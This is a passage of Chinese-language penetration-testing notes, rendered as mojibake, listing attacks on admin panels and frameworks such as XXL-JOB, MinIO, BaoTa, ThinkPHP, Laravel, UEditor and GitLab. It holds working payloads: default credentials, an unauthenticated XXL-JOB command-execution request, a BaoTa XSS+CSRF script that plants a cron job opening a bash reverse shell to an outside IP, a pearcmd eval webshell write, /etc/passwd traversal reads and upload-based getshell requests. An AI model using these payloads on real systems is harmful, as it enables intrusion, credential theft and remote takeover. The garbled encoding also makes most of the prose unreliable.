- vue-typescript-admin

  ![image-20230828171358217](../../../images/image-20230828171358217.png)



### èŠ‹é“

```
/admin-api/infra/file-config/page?pageNo=1&pageSize=10  # æ–‡ä»¶å­˜å‚¨é…ç½®
```





### jeeplus

[ä»£ç å®¡è®¡å…¥é—¨ä¹‹Jeeplusä»£ç å®¡è®¡ - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·](https://www.freebuf.com/articles/web/220066.html)

```
jeeplusåå°æœ‰druidï¼Œå¯ä»¥å°è¯•æœªæˆæƒè®¿é—®
https://xxx/api/jeeplus/druid/index.html
https://xxx/api/jeeplus/swagger-ui.html
```



### Minio--9000ç«¯å£

**é»˜è®¤å£ä»¤**

```
minioadmin/minioadmin
```

**CVE-2023-28432 MinIOä¿¡æ¯æ³„éœ²æ¼æ´** 

æœªç»èº«ä»½è®¤è¯çš„è¿œç¨‹æ”»å‡»è€…é€šè¿‡å‘é€ç‰¹æ®ŠHTTPè¯·æ±‚å³å¯è·å–æ‰€æœ‰ç¯å¢ƒå˜é‡ï¼Œå…¶ä¸­åŒ…æ‹¬MINIO_SECRET_KEYå’ŒMINIO_ROOT_PASSWORDï¼Œé€ æˆæ•æ„Ÿä¿¡æ¯æ³„éœ²ï¼Œæœ€ç»ˆå¯èƒ½å¯¼è‡´æ”»å‡»è€…ä»¥ç®¡ç†å‘˜èº«ä»½ç™»å½•MinIOã€‚

æ³¨æ„ç‚¹ï¼š

> åœ¨MinIOåœ¨å¯åŠ¨æ—¶ä¼šä»ç¯å¢ƒå˜é‡ä¸­è¯»å–ç”¨æˆ·é¢„è®¾çš„ç®¡ç†å‘˜è´¦å·å’Œå¯†ç ï¼Œå¦‚æœçœç•¥åˆ™é»˜è®¤è´¦å·å¯†ç ä¸ºminioadmin/minioadminã€‚
>
> å¦å¤–ï¼Œå¦‚æœå¼€å¯åŠ¨Minioæ—¶æ²¡æœ‰è®¾ç½®MINIO_ROOT_USERå’ŒMINIO_ROOT_PASSWORDï¼Œé‚£ä¹ˆMinioä½¿ç”¨é»˜è®¤è´¦å·å¯†ç minioadminï¼Œè¿™æ—¶å€™å†åšä¿¡æ¯æ³„éœ²éªŒè¯ä¼šå‘ç°è¯»å–ä¸åˆ°ç®¡ç†å‘˜çš„è´¦å·å¯†ç ï¼Œåˆ™æ¨æ–­å­˜åœ¨é»˜è®¤å£ä»¤ã€‚

```
/api/v1/check-version å¯ä»¥æŸ¥çœ‹MinIOç‰ˆæœ¬
```

POC

```http
POST /minio/bootstrap/v1/verify HTTP/1.1
Host: 
User-Agent: Mozilla/5.0
Upgrade-Insecure-Requests: 1
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: en-US;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
```

æ ¹æ®POCæ”¹åŒ…ï¼Œå¯ä»¥çœ‹åˆ°å­˜åœ¨ä¿¡æ¯æ³„éœ²ï¼ŒåŒ…å«å†…ç½‘IPæ³„éœ²ç­‰ã€‚

![å›¾ç‰‡](../../../images/640)

æ‹¿åˆ°è´¦å¯†è¿›å…¥åå°ä¹‹åï¼Œå¯ä»¥åˆ©ç”¨MinIOçš„è‡ªæ›´æ–°è¾¾åˆ°RCE  [MinIOè‡ªæ›´æ–°RCE](https://mp.weixin.qq.com/s/7-nWwsOLUNs7S83CiH2xMQ)

[CVE-2021-21287--SSRF: å®¹å™¨ä¸äº‘çš„ç¢°æ’â€”â€”ä¸€æ¬¡å¯¹MinIOçš„æµ‹è¯• | ç¦»åˆ«æ­Œ](https://www.leavesongs.com/PENETRATION/the-collision-of-containers-and-the-cloud-pentesting-a-MinIO.html)

**ssrf-CVE-2021-21287**

```
POST /minio/webrpc HTTP/1.1
HOST:IP

{"id":1,"jsonrpc":"2.0","params":{"token":"test"},"method":"web.LoginSTS"}
```

åå¼¹shellï¼Ÿ



### xxl-job

XXL-JOBåœ¨çœŸå®æ”»é˜²ä¸‹çš„æ€»ç»“ - å…ˆçŸ¥ç¤¾åŒº
https://xz.aliyun.com/t/13899?time__1311=mqmxnQG%3DF40mD%2F8iiQGk8wdAKTqQqcDDt4D&alichlgref=https%3A%2F%2Fi.hacking8.com%2F

**XXL-JOB-adminï¼ˆé»˜è®¤ç«¯å£8080ï¼‰**

- å¼±å£ä»¤+åå°å‘½ä»¤æ‰§è¡Œ

  ```
  admin/123456
  ```

  ä»»åŠ¡ç®¡ç† - æ–°å¢ è¿è¡Œæ¨¡å¼ä½¿ç”¨ GLUE(Shell) 

  æ“ä½œå¤„é€‰æ‹©Glue IDEå†™å…¥å‘½ä»¤æ‰§è¡Œè„šæœ¬

  ```shell
  #/bin/bash
  cmd
  ```

  æ“ä½œå¤„ç‚¹å‡»æ‰§è¡Œå³å¯

- æœªæˆæƒRCE

  - XxlJob<=2.1.2

    ```
  GET /api
    ```

    ![image-20231107095300800](../../../images/image-20231107095300800.png)
  
    [è€æ›²æ–°å”±ä¹‹XXL-JOBæœªæˆæƒHessian2ååºåˆ—åŒ–è°ƒè¯•åˆ†æ - å…ˆçŸ¥ç¤¾åŒº (aliyun.com)](https://xz.aliyun.com/t/11091#toc-3)
  
    [å¥‡å®‰ä¿¡æ”»é˜²ç¤¾åŒº-[Webå®æˆ˜] è®°ä¸€æ¬¡æ›²æŠ˜çš„ä¸å‡ºç½‘XXL-JOB API Hessianååºåˆ—åŒ–åˆ°Getshell](https://forum.butian.net/share/2505)
  
  - XxlJob >= 2.2.0 
  
    **XXL-JOB-executeï¼ˆé»˜è®¤ç«¯å£9999ï¼‰**
    
    æŒ‡çº¹`POST /run`
    
    ![image-20231102150058249](../../../images/image-20231102150058249.png)
    
    **æ³¨æ„ï¼šæ¯å‘é€ä¸€æ¬¡ä¸‹é¢çš„æ•°æ®åŒ…ï¼Œéƒ½éœ€è¦æ›´æ¢jobidï¼Œå› ä¸ºæ˜¯é€šè¿‡jobidä½œä¸ºç´¢å¼•æ¥æ‰§è¡Œjobçš„**
    
    ```http
    POST /run
    HOST: xxx:9999
    Content-Type: application/json
    XXL-JOB-ACCESS-TOKEN: default_token # é»˜è®¤Tokenè®¤è¯ç»•è¿‡
    
    {
      "jobId": 1,
      "executorHandler": "demoJobHandler",
      "executorParams": "demoJobHandler",
      "executorBlockStrategy": "COVER_EARLY",
      "executorTimeout": 0,
      "logId": 1,
      "logDateTime": 1586629003729,
      "glueType": "GLUE_SHELL", # GLUE_SHELLå¯¹åº”Linuxç³»ç»Ÿï¼ŒGLUE_POWERSHELLå¯¹åº”Windowsç³»ç»Ÿ
      "glueSource": "å‘½ä»¤",
      "glueUpdatetime": 1586699003758,
      "broadcastIndex": 0,
      "broadcastTotal": 0
    }
    ```
  





### å®å¡”--8888ç«¯å£

https://www.t00ls.com/viewthread.php?tid=67047&highlight=%E5%AE%9D%E5%A1%94

https://www.t00ls.com/viewthread.php?tid=68409&highlight=%E5%AE%9D%E5%A1%94

- phpmyadmin

  - pmaæœªæˆæƒè®¿é—®æ¼æ´

    å½±å“ç‰ˆæœ¬

    ```
    å®å¡”Linuxé¢æ¿7.4.2ç‰ˆæœ¬
    å®å¡”Linuxæµ‹è¯•ç‰ˆ7.5.13
    Windowsé¢æ¿6.8ç‰ˆæœ¬
    ```

    payload

    ```
    ip:888/pma
    ```

  - é»˜è®¤phpmyadminè·¯å¾„

    ```
    ip:888/phpmyadmin_éšæœºå­—ç¬¦ä¸²
    ```

- æ—¥å¿—XSS+CSRFå¯¼è‡´çš„è®¡åˆ’ä»»åŠ¡RCE

  å½±å“ç‰ˆæœ¬

  ```
  6.xç‰ˆæœ¬è®°å½•äº†éªŒè¯ç é”™è¯¯å¹¶å­˜å…¥æ•°æ®åº“å½“ä¸­ï¼ˆè€ç‰ˆæœ¬ï¼‰
  <7.9.3ç‰ˆæœ¬å®å¡”ä¼šè®°å½•ç½‘ç«™nginxæ—¥å¿—ï¼Œåå°æŸ¥çœ‹æ—¥å¿—çš„åœ°æ–¹å¯ä»¥XSS
  ```

  payload

  ```js
  1. åœ¨è¯·æ±‚ä¸­æ’å…¥xss
  </textarea><script src=http://ip:port/1.js></script>
  
  2. jså†…å®¹å¦‚ä¸‹
  
  function addTask(TaskName, execTime, ip, port) {
      var execShell = 'bash -i >& /dev/tcp/192.168.1.14/7777 0>&1'; # è¦æ‰§è¡Œçš„å‘½ä»¤
      execShell = encodeURIComponent(execShell);
  
      var params = 'name=' + TaskName + '&type=minute-n&where1=' + execTime + '&hour=&minute=&week=&sType=toShell&sBody=' + execShell + '&sName=&backupTo=localhost&save=&urladdress=undefined';
  
      var xhr = new XMLHttpRequest();
      xhr.open('POST', '/crontab?action=AddCrontab', false);
      xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
      xhr.send(params);
  }
  
  function execTask(TaskName) {
      var xhr = new XMLHttpRequest();
      xhr.open('POST', '/crontab?action=GetCrontab', true);
      xhr.send();
  
      xhr.onload = function () {
          if (this.readyState == 4 && this.status == 200) {
              var res = JSON.parse(this.responseText);
  
              if (res[0].name == TaskName) {
                  var TaskID = res[0].id.toString();
                  var xhr = new XMLHttpRequest();
                  xhr.open('POST', '/crontab?action=StartTask', false);
                  xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
                  var params = 'id=' + TaskID;
                  xhr.send(params);
  
                  delTask(res[0].id);
                  console.log(res[0].id);
                  return res[0].id;
              }
          }
      }
  }
  
  function delTask(TaskID) {
      var params = 'id=' + TaskID.toString();
      var xhr = new XMLHttpRequest();
      xhr.open('POST', '/crontab?action=DelCrontab', false);
      xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
      xhr.send(params);
  }
  
  var TaskName = Math.random().toString(36).substring(7);
  addTask(TaskName, '5', '1.1.1.1', '53');
  execTask(TaskName);
  ```

- æ•°æ®åº“ç›¸å…³

  é»˜è®¤ä¿å­˜ä½ç½®

  ```cmd
  # Windows
  C:/BtSoft/panel/data
  
  # Linux
  /server/panel/data
  ```
  
  |     æ–‡ä»¶      |          ä½œç”¨          |
  | :-----------: | :--------------------: |
  |  default.db   |  æ•°æ®åº“ï¼Œä¿å­˜ç™»å½•ä¿¡æ¯  |
  |    port.pl    |   æ–‡æœ¬ï¼Œä¿å­˜å¼€æ”¾ç«¯å£   |
  | admin_path.pl |   æ–‡æœ¬ï¼Œä¿å­˜åå°ç›®å½•   |
  |  default.pl   | æ–‡æœ¬ï¼Œä¿å­˜é»˜è®¤ç™»é™†å¯†ç  |
  
    `default.db`
  
    è´¦å·å¯†ç å­˜åœ¨usersè¡¨ä¸­
  
    ![image-20231222152409518](../../../images/image-20231222152409518.png)
  
    å¯¹äºpasswordçš„åŠ å¯†æ–¹å¼ä¸º
  
    **md5(md5(md5(password)+'_bt.cn')+salt)**
  
    å…¶ä¸­passwordä¸ºæ˜æ–‡å¯†ç ï¼Œsaltåœ¨usersä¸­çš„saltå­—æ®µ
  
    å¯†ç åŠ å¯†è„šæœ¬å¦‚ä¸‹
  
    ```python
    import hashlib
    # MD5 hashing with additional strings as per the provided pattern
    original_text = "5fa0a808"
    additional_string1 = "_bt.cn"
    additional_string2 = "GqYa0loI4RPm"
    
    # First MD5 hash
    first_md5 = hashlib.md5(original_text.encode()).hexdigest()
  
    # Second MD5 hash with additional string 1
  second_md5 = hashlib.md5((first_md5 + additional_string1).encode()).hexdigest()
    
    # Final MD5 hash with additional string 2
    final_md5 = hashlib.md5((second_md5 + additional_string2).encode()).hexdigest()
    print(final_md5)
    ```

  æ—¥å¿—ä¿å­˜åœ¨logsè¡¨é‡Œ

  ![image-20231222152227591](../../../images/image-20231222152227591.png)

- ![image-20231227114702035](../../../images/image-20231227114702035.png)








### adminer

![20220415164052-c209290a-bc97-1](../../../images/20220415164052-c209290a-bc97-1.png)

[ä¸€æ¬¡adminerä¹‹æ—… - å…ˆçŸ¥ç¤¾åŒº (aliyun.com)](https://xz.aliyun.com/t/11225#toc-6)

[Adminer(<4.7.9)-SSRF-ä¼—æµ‹æ—¶å¤ç°+Ffufæ‰¹é‡è„šæœ¬ Â· è¯­é›€ (yuque.com)](https://www.yuque.com/challenger-sfhjb/blog/xv4gts)



### ç¼–è¾‘å™¨

#### Fckeditor

https://github.com/BaizeSec/bylibrary/blob/main/docs/%E6%BC%8F%E6%B4%9E%E5%BA%93/02-%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/FCKeditor/FCKeditor%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E%E9%80%9A%E6%9D%80.md

#### kindeditor

- æ–‡ä»¶ä¸Šä¼ xss

  ä¸Šä¼ è·¯å¾„

  ```php
  /kindeditor/asp/upload_json.asp?dir=file
  /kindeditor/asp.net/upload_json.ashx?dir=file
  /kindeditor/jsp/upload_json.jsp?dir=file
  /kindeditor/php/upload_json.php?dir=file
  ```

  ```php
  POST /admin/kindeditor/asp/upload_json.asp?dir=file HTTP/1.1
  Host: xxx
  Content-Length: 210
  Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryZ4ILit8qr5XXhdT5
  Connection: close
  
  ------WebKitFormBoundaryZ4ILit8qr5XXhdT5
  Content-Disposition: form-data; name="imgFile"; filename="1.html"
  Content-Type: text/html
  
  <img src=1 onerror=alert(1)>
  ------WebKitFormBoundaryZ4ILit8qr5XXhdT5--
  ```

- åˆ—ç›®å½•

  ```php
  /kindeditor/php/file_manager_json.php?path=/ 
  ```

- F12ä¿®æ”¹åç¼€é‡å‘½åæ–‡ä»¶getshell



#### Ueditor

- SSRF

  ```shell
  /ueditor/jsp/getRemoteImage.jsp?upfile=url
  /ueditor/jsp/controller.jsp?action=catchimage&source[]=url
  /ueditor/php/controller.php?action=catchimage&source[]=url
  ```

- æ–‡ä»¶ä¸Šä¼ 

  - XSS

    > Ueditor é»˜è®¤æ”¯æŒä¸Šä¼  xml ï¼šconfig.jsonå¯ä»¥æŸ¥çœ‹æ”¯æŒä¸Šä¼ çš„åç¼€

    ```
    /ueditor/asp/config.json
    /ueditor/net/config.json
    /ueditor/php/config.json
    /ueditor/jsp/config.json
    ```

    ä¸Šä¼ PATH

    ```
    /ueditor/xxx/controller.php?action=uploadfile
    /ueditor/xxx/controller.php?action=uploadimage
    ```

    æ•°æ®åŒ…

    ```http
  Content-Type: multipart/form-data; boundary=----WebKitFormBoundary9zWBDx6vAJHGTpAl
    Content-Length: 325
    
    ------WebKitFormBoundary9zWBDx6vAJHGTpAl
    Content-Disposition: form-data; name="upfile"; filename="1.xml"
    Content-Type: image/png
    
    <html>
    <head></head>
    <body>
    <something:script xmlns:something="http://www.w3.org/1999/xhtml"> alert(1);
    </something:script>
    </body>
    </html>
    ------WebKitFormBoundary9zWBDx6vAJHGTpAl
    ```
  
    é—®é¢˜

    ![image-20230928150035548](../../../images/image-20230928150035548.png)
  
  - .netä¸‹GetShell
  
    > æœåŠ¡å™¨ä¸Šå­˜æ”¾åä¸º666.jpgçš„å›¾ç‰‡é©¬
  
    ```http
    POST /æ›¿æ¢æ¼æ´URLåœ°å€æ‹¼æ¥/UEditor/net/controller.ashx?action=catchimage HTTP/1.1
    Host: x.x.x.x
    Upgrade-Insecure-Requests: 1
    User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.60 Safari/537.36
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9
    sec-ch-ua-platform: "Windows"
    sec-ch-ua: "Google Chrome";v="100", "Chromium";v="100", "Not=A?Brand";v="24"
    sec-ch-ua-mobile: ?0
    Connection: close
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 49
    
    source[]=http://æ›¿æ¢ä¸ºè‡ªå·±æœåŠ¡å™¨å¼€å¯httpæœåŠ¡çš„URLåœ°å€/666.jpg?.aspx
    ```
  



### å¸†è½¯

[å®‰å…¨æ¼æ´å£°æ˜- FineReportå¸®åŠ©æ–‡æ¡£ - å…¨é¢çš„æŠ¥è¡¨ä½¿ç”¨æ•™ç¨‹å’Œå­¦ä¹ èµ„æ–™](https://help.fanruan.com/finereport/doc-view-4833.html)

èƒ½å¤Ÿä½œä¸ºè‡´è¿œOAçš„ç»„ä»¶

- å¸†è½¯V8

  [å¥‡å®‰ä¿¡æ”»é˜²ç¤¾åŒº-å¸†è½¯æŠ¥è¡¨ V8.0 ç»„åˆæ‹³æ¼æ´åˆ†æåŠå¤ç°](https://forum.butian.net/share/2390)

  [å¸†è½¯æŠ¥è¡¨ç»„åˆæ‹³æ¼æ´åˆ†æ](https://mp.weixin.qq.com/s?__biz=Mzg3NjY1MDEwNA==&mid=2247483675&idx=1&sn=3a6d8544cf5d4396b21d49ab91bd59bf&chksm=cf2e4a0cf859c31ab0703576966a1c46dd565e29cacd3fba3116ba3684923b80286ea1041e31&scene=126&sessionid=1647656066&subscene=207&key=b58103fa9e1debe406843de4e261019a638ff6adb409cef53de99d6db836986a2d16232425a37f1e3d56c18d1c08821da5713530b2aa9646cfd37bece4f874cf51cf11dcb88ca80a05286826a662b7f6515c8ad6fc7c01517ac5ab3996de95d328bd72fda95f86dbbdbb37765685dc68733dca335ff43cb90e04a003d38c1869&ascene=0&uin=MTM1NzU2MDQ1OQ%3D%3D&devicetype=Windows+Server+2016+x64&version=6305002e&lang=zh_CN&exportke)

  [å¸†è½¯æŠ¥è¡¨ V8 get_geo_json ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ CNVD-2018-04757 - Vuls Wiki](https://vuls.info/PeiQi/wiki/oa/å¸†è½¯OA/å¸†è½¯æŠ¥è¡¨ V8 get_geo_json ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ CNVD-2018-04757/#_4)

  [FineReportï¼ˆå¸†è½¯ï¼‰æŠ¥è¡¨ç³»ç»Ÿç›®å½•éå†æ¼æ´å¤ç°å’Œç”¨ç®€æ˜“è¿‡æ»¤å™¨å¤„ç† - ç°ä¿¡ç½‘ï¼ˆè½¯ä»¶å¼€å‘åšå®¢èšåˆï¼‰](https://www.freesion.com/article/1056237571/)

  ![img](../../../images/image)

  ![image-20230731170236076](../../../images/image-20230731170236076.png)

- å¸†è½¯V9

  [å¸†è½¯ï¼ˆFineReport) V9ä»»æ„æ–‡ä»¶è¦†ç›–æ¼æ´ - å…ˆçŸ¥ç¤¾åŒº](https://xz.aliyun.com/t/9578)

- å¸†è½¯V10

  ååºåˆ—åŒ–
  
  ```
  webroot/decision/remote/design/channel
  ```
  
  





```
# è·¯å¾„
WebReport/ReportServer
```





### Blade-X

å›¾æ ‡

![favicon](../../../images/favicon.png)

[å¥‡å®‰ä¿¡æ”»é˜²ç¤¾åŒº-spring-blade SQLæ³¨å…¥æ¼æ´ (butian.net)](https://forum.butian.net/share/1089)

[è½¬è½½ï¼šSpringBladeæ¡†æ¶JWTè®¤è¯ç¼ºé™·æ¼æ´CVE-2021-44910 - æ˜é‡‘ (juejin.cn)](https://juejin.cn/post/7194311491175055418)





### ThinkPHP

ä»£ç å®¡è®¡ä¹‹tpå„ç‰ˆæœ¬é“¾å­è°ƒå¼éšç¬” - å…ˆçŸ¥ç¤¾åŒº
http://xz.aliyun.com/t/14038?time__1311=eqIxBDyD07G%3DYiKitD%2FWn2b8QiqqAKD8YeD#toc-28

- debugæ¨¡å¼ä¸‹

  - æ•æ„Ÿå˜é‡æ³„æ¼ï¼šæ¯”å¦‚æ•°æ®åº“çš„è´¦å¯†

  - æ—¥å¿—æ³„æ¼ï¼ˆè¿™ä¸ªæ„Ÿè§‰æ¯”è¾ƒå¤šï¼‰

    ```shell
    # é»˜è®¤æ—¥å¿—åä¸ºyear_month_day.log
    /Application/Runtime/Logs/app_name/æ—¥å¿—å
    /Runtime/Logs/app_name/æ—¥å¿—å
    
    # å…¶ä»–ç¢°è§è¿‡çš„æ—¥å¿—å
    day.log
    /year/month/day.log
    ```

  - æ‰¾ç™»å½•æ—¥å¿—è¿›åå°

  - è§‚å¯Ÿsqlè¯­å¥è¿›è¡ŒSQLæ³¨å…¥

  - cacheæ–‡ä»¶getshell <= 5.10

    > ç¼“å­˜æ–‡ä»¶ï¼šç½‘ç«™ä¸ºäº†å®ç°åŠ é€Ÿè®¿é—®ï¼Œä¼šå°†ç”¨æˆ·è®¿é—®è¿‡çš„é¡µé¢å­˜å…¥ç¼“å­˜æ¥å‡å°æ•°æ®åº“æŸ¥è¯¢çš„å¼€é”€
    >
    > å¯èƒ½éœ€è¦é€šè¿‡æ—¥å¿—æ‰¾åˆ°cacheæ–‡ä»¶çš„å‘½åæ–¹å¼

    é»˜è®¤æƒ…å†µä¸‹

    ```php
    # æ¼æ´å½¢æˆç‚¹
    Cache::set("name",$value,3600); # set(ç¼“å­˜æ ‡è¯†ï¼Œç¼“å­˜å€¼ï¼Œç¼“å­˜ä¿ç•™æ—¶é—´)
    $data   = "<?php\n//" . sprintf('%012d', $expire) . $data . "\n?>";
    
    # payload
    $data="%0a%0dphpinfo();//"
    
    # ç”Ÿæˆçš„ç¼“å­˜æ–‡ä»¶ä½ç½®
    /runtime/cache/MD5(name)å‰ä¸¤ä½/MD5(name)å30ä½.php
    ```

- æ–‡ä»¶è¯»å–

  ```http
  ?s=index/\think\Lang/load&file=/etc/passwd
  ```

- ååºåˆ—åŒ–

  Thinkphp5 RCEæ€»ç»“ - Y4erçš„åšå®¢
  https://y4er.com/posts/thinkphp5-rce/#5010
  
  å…³é”®æ˜¯æ‰¾å¥½è·¯ç”±ï¼Œé»˜è®¤æ˜¯ä»¥./public/index.phpä½œä¸ºå…¥å£æ–‡ä»¶ï¼Œä½†æ˜¯å¾ˆå¤šéƒ½æ˜¯äºŒå¼€ï¼Œå…¥å£æ–‡ä»¶ä¸ä¸€æ ·
  
  ![image-20230822212120431](../../../images/image-20230822212120431.png)
  
- ThinkPHP<6.0.13ï¼Œå¤šè¯­è¨€æ¨¡å—å†™ğŸï¼ˆè¿™ä¸ªæ¼æ´çš„çŸ¥è¯†ç‚¹åœ¨CTFä¸­å‡ºç°è¿‡å¾ˆå¤šæ¬¡ï¼Œå› ä¸ºdockerä¸‹çš„PHPç¯å¢ƒé»˜è®¤æ»¡è¶³ä»¥ä¸‹å‰ææ¡ä»¶ï¼‰

  å‰ææ¡ä»¶ï¼š

  1. PHPç¯å¢ƒå¼€å¯äº†`register_argc_argv`
  2. PHPç¯å¢ƒå®‰è£…äº†pcel/pear

  payload

  ```shell
  ?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/<?=@eval($_REQUEST['a']);?>+/var/www/html/a.php
  ```

  > è®°å¾—åœ¨burpä¸­å‘é€ï¼Œå¦åˆ™æµè§ˆå™¨ä¼šå°†<ç¼–ç å¯¼è‡´æ— æ³•è§£æ

- ç›¸å…³æ–‡ç« 

  ä¸€æ¬¡å®æˆ˜ä¸­å¯¹tp5ç½‘ç«™getshellæ–¹å¼çš„æµ‹è¯• - å…ˆçŸ¥ç¤¾åŒº
  https://xz.aliyun.com/t/10397?u_atoken=bd39fa3f-27e6-48c8-8b24-0914f7d52cea&u_asession=0107aUPLH02VyMq5l2bQ1rJqxO9w09bZdhtwpo-LcXEMlexgaezyHFq8YP73UBF0dHxb7w_ePXHSZCYxDkbgVwRtsq8AL43dpOnCClYrgFm6o&u_asig=05TLfL3h27z5sjRpO60Xhk4KJy4jzYas6TL5hoa3TC-XZZ7_Qqh-xR721_HDl1HXsWX6duFq3DEUnpjEdBOtUxCt_3Ro2HyeedXcyLFtm4EAFaXTgQSh0_yThH-4s10MXVrLloBgFgEDzkpHBSzONvZW_dqCVdL-mrGHvozk4u6EzaKUxtB9OnxETkEKIRw6I4ksmHjM0JOodanL5-M1Qs1RNYVI7Zx8cse5jmZICjbJo1odU9NAP3CLNgLKXD3WsYJ9teUCXjKpGfDlN67LYSUPcOlfkLn0Wijfp9ix1RLDLUpLHxH1iRKZmnjAu0Zefw&u_aref=PM9yMaut3%2FM9WTgVfiEQMWW6YX0%3D
  
  å¥‡å®‰ä¿¡æ”»é˜²ç¤¾åŒº-Thinkphp5-rce-è¿‡å®å¡”å°æ€è·¯
  https://forum.butian.net/index.php/share/1121
  
  

### ThinkphpäºŒå¼€æ¡†æ¶

#### hisiphp

ä» hisiphp ä¸­ getshell - ç«çº¿ Zone-å®‰å…¨æ”»é˜²ç¤¾åŒº
https://zone.huoxian.cn/d/2726-hisiphp-getshell

Hisiphpä»£ç å®¡è®¡åå°getshell_hisiphp æ¼æ´-CSDNåšå®¢
https://blog.csdn.net/qq_18193739/article/details/132765176

csrf and xss Vulnerability Â· Issue #3 Â· hisiphp/hisiphp
https://github.com/hisiphp/hisiphp/issues/3

#### ThinkAdmin

https://www.t00ls.com/viewthread.php?tid=68505&amp;highlight=thinkadmin



#### FastAdmins

```
admin.php/index/login
```

æ¡†æ¶ç‰¹å¾

![image-20230913172616785](../../../images/image-20230913172616785.png)

![image-20230724153102913](../../../images/image-20230724153102913.png)

![image-20230805193921798](../../../images/image-20230805193921798.png)

æ¡†æ¶äº†è§£

FastAdminåœ¨çº¿æ¼”ç¤º,FastAdminæ’ä»¶æ¼”ç¤º â€“ åŸºäºThinkPHPå’ŒBootstrapçš„æé€Ÿåå°å¼€å‘æ¡†æ¶
https://www.fastadmin.net/demo.html



æ¸—é€å§¿åŠ¿

ThinkPHP 5æ—¥å¿—æ–‡ä»¶åŒ…å«trick - æ°´æ³¡æ³¡ - åšå®¢å›­
https://www.cnblogs.com/r00tuser/p/14344922.html

[Fastadmin æ¼æ´åˆé›† | Caps](https://www.loadcaps.com/posts/2bcc03cb.html)

ä»»æ„æ–‡ä»¶è¯»å–

```
/index/ajax/lang?lang=../../application/database
```









### Laravel

index.php

![image-20230926145212432](../../../images/image-20230926145212432.png)

æŠ¥é”™ä¿¡æ¯

![image-20230926145157351](../../../images/image-20230926145157351.png)

- debugæ¨¡å¼ä¸‹ä¿¡æ¯æ³„æ¼

  ```http
  ä½¿ç”¨ä¸å…è®¸çš„è¯·æ±‚æ–¹æ³•
  æˆ–è€…ç›®å½•æ‰«æï¼Ÿï¼Ÿï¼Ÿ
  .env
  vendor/.env
  lib/.env
  lab/.env
  cronlab/.env
  cron/.env
  core/.env
  core/app/.env
  core/Database/.env
  database/.env
  config/.env
  assets/.env
  app/.env
  apps/.env
  uploads/.env
  sitemaps/.env
  site/.env
  admin/.env
  web/.env
  public/.env
  en/.env
  tools/.env
  v1/.env
  administrator/.env
  laravel/.env
  ```

- ä»»æ„ç”¨æˆ·ç™»å½•<8.23

  ```http
  content-type:application/json
  
  {"username":[0,0],"password":"1"}
  ```
  
- NDay

  [Laravel Debug mode RCEï¼ˆCVE-2021-3129ï¼‰åˆ†æå¤ç° - å…ˆçŸ¥ç¤¾åŒº (aliyun.com)](https://xz.aliyun.com/t/9030)



#### CVE-2018-15133

- Laravel framework 5.5.x<=5.5.40ï¼ŒLaravel framework 5.6.x<=5.6.29
- éœ€è¦çŸ¥é“app_keyï¼ˆdebugæ¨¡å¼ä¸‹çš„base64å­—ç¬¦ä¸²ï¼‰

[aljavier/exploit_laravel_cve-2018-15133: Exploit for Laravel Remote Code Execution with API_KEY (CVE-2018-15133) (github.com)](https://github.com/aljavier/exploit_laravel_cve-2018-15133)

```bash
python pwn_laravel.py url App_key -c command 
æˆ–è€…-iè¿›å…¥äº¤äº’æ¨¡å¼
```

é‡åˆ°çš„é—®é¢˜

- çˆ†ç ´åå°æ—¶ï¼ŒçŠ¶æ€ç å…¨ä¸º419

  Laravelä¸ºäº†é˜²æ­¢è·¨åŸŸæ”»å‡»ä¼šæœ‰ä¸€ä¸ªCSRF-TOKENï¼Œå¦‚æœTokenè¿‡æœŸäº†ï¼Œå‘èµ·çš„è¯·æ±‚å°±ä¼šéƒ½æ˜¯419çŠ¶æ€ç ï¼Œéœ€è¦é‡æ–°è·å–CSRF-TOKEN



xssåˆ·æ´

```
/_ignition/scripts/--><svg onload=alert('momika233')>
```





### GitLab

- nmapç‰ˆæœ¬åˆ¤æ–­

  https://github.com/righel/gitlab-version-nse/

- ç›®å½•ç©¿è¶Šè¯»å–æ–‡ä»¶--CVE-2023-2825--å®é™…åˆ©ç”¨æ„Ÿè§‰æŒºéš¾çš„

  å‰ææ¡ä»¶ï¼š

  ```
  gitlab-ee/ce == 16.0.0
  
  å­˜åœ¨å¯ä»¥è¾¾åˆ°æ ¹â½¬å½•çš„åµŒå¥—å¯å…¬å¼€è®¿é—®åˆ°çš„groupé¡¹â½¬â½½ä¸”å­˜åœ¨é™„ä»¶(issus è¯„è®ºç­‰)
  æˆ–æ™®é€šâ½¤æˆ·æƒé™â¼¿åŠ¨åˆ›å»ºå¤šå±‚groupå’Œé¡¹â½¬
  ```

  payload

  ```http
  # 123ä¸ºissueæ ‡é¢˜ï¼Œuploads/dde0c86647fa452e76b94c9588d7fcbbä¸ºé™„ä»¶æ‰€åœ¨ç›®å½•
  http://your-ip/group1/group2/group3/group4/group5/group6/group7/group8/group9/123/uploads/dde0c86647fa452e76b94c9588d7fcbb/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
  ```

- SSRF

  [CVE-2021-22214 GITLAB SSRF æœªæˆæƒæ¼æ´-å®‰å…¨å®¢ - å®‰å…¨èµ„è®¯å¹³å°](https://www.anquanke.com/post/id/271555)

- RCE

